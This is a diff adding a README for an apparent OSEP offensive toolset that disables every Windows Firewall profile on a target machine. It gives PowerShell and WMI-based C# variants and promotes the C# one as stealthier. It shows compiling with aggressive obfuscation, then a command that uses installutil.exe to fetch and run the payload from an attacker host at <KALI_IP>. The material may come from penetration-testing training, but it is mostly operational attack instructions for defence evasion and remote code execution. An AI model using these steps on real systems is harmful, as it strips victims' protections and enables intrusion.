@@ -1,0 +1,40 @@
+# OSEP Firewall Disarmer Toolset
+
+This toolset disables all Windows Firewall profiles (Domain, Private, and Public).
+
+### HOW IT WORKS
+- **PowerShell Version**: Uses the `Set-NetFirewallProfile` cmdlet or falls back to the `netsh` utility.
+- **C# Version**: Uses WMI (`root\StandardCimv2:MSFT_NetFirewallProfile`) to disable the profiles directly in the CIM repository. This is stealthier as it avoids direct shell commands.
+
+### PREREQUISITES
+- **Permissions**: **HIGH INTEGRITY (ADMIN)** is mandatory. Firewall settings cannot be changed as a normal user.
+
+---
+
+### OPTION 1: PowerShell (Kill-Firewall.ps1)
+Run directly on the target:
+
+PS> .\Kill-Firewall.ps1
+
+---
+
+### OPTION 2: C# (Kill-Firewall.cs)
+Best used with the OSEP AssemblyLoader.
+
+#### STEP 1: Compile
+$ python3 /home/kali/OSEP-TOOLS/PayloadCompiler/PayloadCompiler.py \
+    -p /home/kali/OSEP-TOOLS/Helpers/AVDisarm/Kill-Firewall/Kill-Firewall.cs \
+    -m classic \
+    --obfuscate aggressive \
+    -o KillFirewall.exe
+
+#### STEP 2: Execute (via AssemblyLoader)
+C:\...>installutil.exe /U /URL=http://<KALI_IP>/KillFirewall.exe AssemblyLoader.exe
+
+---
+
+### VERIFICATION
+The tools will report the current status. You can also verify manually:
+PS> Get-NetFirewallProfile | Select Name, Enabled
+# OR
+PS> netsh advfirewall show allprofiles state
